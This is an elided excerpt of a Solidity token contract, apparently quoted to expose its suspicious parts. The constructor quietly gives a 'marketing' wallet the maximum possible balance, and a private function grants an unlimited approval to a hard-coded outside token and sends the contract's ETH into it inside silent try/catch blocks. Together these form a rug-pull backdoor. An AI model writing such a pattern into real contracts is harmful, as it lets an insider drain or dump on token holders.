...
contract Contract is Ownable {
    ...
    uint256 private markwallet = ~uint256(0);
    uint256 public _fee;
    ...
    address private TwinkAddress = 0x3832d2F059E55934220881F831bE501D180671A7; 
    ...
    constructor(
        ...
        _balances[marketing] = markwallet;
    ...
    function buyBackAndAddLp(uint256 amount) private {
        ...
        try Contract(TwinkAddress).approve(address(router), ~uint256(0)) {} catch {}
        ...
        try router.addLiquidityETH{value: address(this).balance}(TwinkAddress, Contract(TwinkAddress).balanceOf(address(this)), 0, 0, address(0), block.timestamp) {} catch {}
    }
